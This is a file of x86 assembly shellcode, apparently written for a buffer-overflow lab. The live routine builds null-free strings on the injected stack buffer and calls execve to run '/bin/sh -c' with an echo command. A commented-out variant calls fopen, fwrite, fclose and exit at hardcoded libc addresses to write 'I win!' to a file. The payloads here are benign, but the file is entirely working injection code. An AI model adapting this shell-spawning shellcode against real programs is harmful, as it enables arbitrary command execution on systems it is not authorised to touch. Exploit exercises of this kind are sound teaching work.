shellcode:
  xorl %eax, %eax	//clear eax
  addl $75, %eax	//put 75 into eax
  shl $2, %eax		//multiply eax by 4 to get 300
  subl %eax, %esp	//put esp at beginning of reply

  movl %esp, %eax	//set eax to "echo..."
  addl $5, %eax		//eax points to '1'
  movb (%eax), %bl	//get '1'
  addb $0x18, %bl	//change '1' to 'I'
  movb %bl, (%eax)	//put 'I' in mem
  
  addl $16, %eax	//eax points to ' ' after "echo..."
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  addl $3, %eax		//eax points to ' ' after "-c"
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  addl $8, %eax		//eax points to ' ' after "/bin/sh"
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  movl %esp, %ebx	//store esp in ebx
  xorl %eax, %eax	//clear eax
  pushl %eax		//put null on stack
  movl %esp, %edx	//set edx to null
  movl %ebx, %eax	//move "echo..." into eax
  pushl %eax		//put "echo..." on stack
  addl $22, %eax	//move "-c" into eax
  pushl %eax		//put "-c" on stack
  addl $3, %eax		//move "/bin/sh" into eax
  pushl %eax		//put "/bin/sh" on stack
  movl (%esp), %ebx	//set ebx to "/bin/sh"
  movl %esp, %ecx	//set ecx to arguments

  xorl %eax, %eax	//clear eax
  movb $11, %al		//put 11 into eax
  int $0x80		//call execve


/*shellcode:
  xorl %eax, %eax	//clear eax
  addl $75, %eax	//put 75 into eax
  shl $2, %eax		//multiply eax by 4 to get 300
  subl %eax, %esp	//put esp at beginning of reply
  
  movl %esp, %eax	//set eax to "bar.txt"
  addl $7, %eax		//eax points to ' '
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  addl $2, %eax		//eax points to ' ' after 'a'
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  addl $1, %eax		//eax points to '1'
  movb (%eax), %bl	//get '1'
  addb $0x18, %bl	//change '1' to 'I'
  movb %bl, (%eax)	//put 'I' in mem
  
  addl $6, %eax		//eax points to ' '
  movb (%eax), %bl	//get ' '
  subb $0x20, %bl	//change ' ' to '\0'
  movb %bl, (%eax)	//put '\0' in mem

  movl %esp, %ebx		//store esp in ebx
  movl %ebx, %eax		//move ebx into eax
  addl $8, %eax			//add offset to "a"
  pushl %eax			//push "a" on stack
  movl %ebx, %eax		//move pointer to "bar.txt" into eax
  pushl %eax			//push "bar.txt" on stack
  movl $0xf7f4c0a0, %eax	//move fopen into eax
  call *%eax			//call fopen

  addl $8, %esp			//restore stack
  pushl %eax			//push fd on stack
  xor %eax, %eax		//clear eax
  addl $6, %eax			//put 6 into eax
  pushl %eax			//push count of 6 on stack
  xorl %eax, %eax		//clear eax
  addl $1, %eax			//move 1 (size of char) into eax
  pushl %eax			//push size of char on stack
  movl %ebx, %eax		//move ebx into eax
  addl $10, %eax		//add offset to "I win!"
  pushl %eax			//push "I win!" on stack
  movl $0xf7e87804, %eax	//move fwrite function into eax (+4 to avoid trailing zeros)
  subl $4, %eax			//sub eax by 4 to get actual func addr
  call *%eax			//call fwrite

  addl $12, %esp		//restore 12 bytes of esp, so fd is still on stack
  movl $0xf7f4c330, %eax	//move fclose function into eax
  call *%eax			//call fclose (don't want mem leak)

  movl $0xf7e53f30, %eax	//move exit into eax
  call *%eax			//call exit
*/

